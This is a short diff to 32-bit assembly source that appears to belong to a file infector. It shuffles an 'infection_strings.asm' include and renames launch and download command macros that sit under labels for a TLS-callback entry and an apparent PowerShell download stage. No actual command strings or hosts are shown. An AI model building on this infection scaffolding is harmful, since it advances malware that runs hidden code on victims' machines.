@@ -1,9 +1,9 @@
+%include "infection_strings.asm"
+
 section .text
 [BITS 32]
 
 ; %define TLS
-
-%include "infection_strings.asm"
    
 global main
    ; this is now a TLS callback, which has the following header:
@@ -27,11 +27,11 @@ main:
 infection__data__start:         ; this prevents relocations from forming because we are not
                                 ; using absolute addresses for our data, making it more portable  
 infection__data__sheep:
-   LAUNCH_COMMAND               ; dd str_len
+   launch_command               ; dd str_len
    ;; db key
    ;; db string_data
 infection__data__powershell:
-   DOWNLOAD_COMMAND             ; dd str_len
+   download_command             ; dd str_len
    ;; db key
    ;; db string_data
 infection__data:
